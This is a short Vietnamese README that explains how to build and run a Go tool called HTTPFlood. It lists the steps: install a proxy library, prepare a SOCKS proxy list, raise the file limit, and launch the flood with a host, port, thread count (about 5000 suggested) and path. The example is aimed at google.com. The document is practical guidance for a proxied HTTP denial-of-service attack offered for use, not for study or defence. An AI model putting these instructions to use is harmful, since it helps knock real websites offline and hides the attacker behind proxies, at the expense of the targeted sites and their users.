# Cách dùng

Tải và cài đặt Golang, sau đó cài thư viện github.com/gamexg/proxyclient

Sau đó build file bằng cách chạy go build HTTPFlood.go và chuẩn bị một list SOCKS5 bỏ vào 1 file tên là socks5.txt

Sau đó chạy ulimit -n 999999

chmod 777 *

Và cuối cùng là ./HTTPFlood HOST PORT THREAD (Nếu trên Cloud Shell thì tầm 5000 là ok) PATH SOCKS_VERSION (socks4/socks5)

VD: ./HTTPFlood google.com 443 5000 / socks4

